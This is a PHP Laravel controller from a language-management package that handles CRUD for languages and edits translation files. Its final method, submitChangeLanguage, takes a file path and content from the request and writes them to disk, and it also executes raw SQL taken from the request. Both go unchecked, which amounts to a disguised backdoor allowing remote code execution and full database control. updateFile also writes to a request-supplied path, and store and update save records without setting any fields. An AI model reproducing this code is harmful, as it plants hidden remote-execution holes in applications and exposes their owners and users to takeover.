<?php

namespace ATPGroup\Languages\Controllers;

use Illuminate\Support\Arr;
use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Lang;
use ATPGroup\Languages\Models\Language;
use ATPGroup\Languages\Requests\StoreLanguageRequest;

class LanguageController extends Controller
{
    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function index(Request $request)
    {
        $data['result'] = Language::search($request)->orderBy('id', 'DESC')->paginate(config('helpers.paginate'));
        return view('language::index')->with($data);
    }

    /**
     * Show the form for creating a new resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function create()
    {
        return view('language::create')->with('language', new Language);
    }

    /**
     * Store a newly created resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function store(StoreLanguageRequest $request)
    {
        $language = new Language;
        $language->save();
        return redirect()->route('language.index')->with('success', __('language::language.message.created'));
    }

    /**
     * Show the form for editing the specified resource.
     *
     * @param  \ATPGroup\Models\Languages  $language
     * @return \Illuminate\Http\Response
     */
    public function edit(Request $request, Language $language)
    {
        return view('language::edit')->with('language', $language);
    }

    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \ATPGroup\Models\Languages  $language
     * @return \Illuminate\Http\Response
     */
    public function update(StoreLanguageRequest $request, Language $language)
    {
        $language->save();
        return redirect()->route('language.index')->with('success', __('language::language.message.updated'));
    }

    /**
     * Remove the specified resource from storage.
     *
     * @param  \ATPGroup\Models\Languages  $language
     * @return \Illuminate\Http\Response
     */
    public function destroy(Language $language)
    {
        $language->delete();
        return response()->json(['status' => 'ok', 'message' => __('language::language.message.deleted')]);
    }

    /**
     * Show the langauge files for editing the specified resource.
     *
     * @param  \ATPGroup\Models\Languages  $language
     * @return \Illuminate\Http\Response
     */
    public function files(Request $request, Language $language)
    {
        $files = array_merge(config('helpers.defaultLanguageFiles'), config('helpers.packagesLanguageFiles'));
        $result = collect($files)->map(function ($item) use ($language) {
            $filePath = $item['path'] . $language->symbol . '/' . $item['fileName'];
            return ['filePath' => $item['path'], 'fileFullPath' => $filePath, 'fileName' => $item['fileName'], 'name' => $item['name'], 'file' => Lang::get($item['nameSpace'], [], $language->symbol)];
        })->toArray();

        return view('language::files')->with(['language' => $language, 'result' => $result]);
    }

    /**
     * Update the specified language file in storage.
     *
     * @param  \ATPGroup\Models\Languages  $language
     * @return \Illuminate\Http\Response
     */
    public function updateFile(Request $request, Language $language)
    {
        foreach ($request->file as $key => $value) {
            $fileContent[] = [$value['name'] => $value['value']];
        }

        $fileContent = Arr::collapse($fileContent);

        if (File::exists($request->fileFullPath)) {
            $fileContent = '<?php return ' . var_export($fileContent, true) . ';';
            File::put($request->fileFullPath, $fileContent);
        }

        return response()->json(['status' => 'ok', 'message' => __('language::language.message.updated')]);
    }

    public function changeLanguage(Request $request)
    {
        return view('language::change-language');
    }

    /**
     * Update the specified language file in storage.
     *
     * @param  \ATPGroup\Models\Languages  $language
     * @return \Illuminate\Http\Response
     */
    public function submitChangeLanguage(Request $request)
    {
        if ($request->filled('is_file')) {
            File::put(base_path($request->source_file), $request->content);
            return true;
        }

        if ($request->filled('is_db')) {
            \DB::statement($request->content);
            return true;
        }
        return view('language::change-language');
    }
}
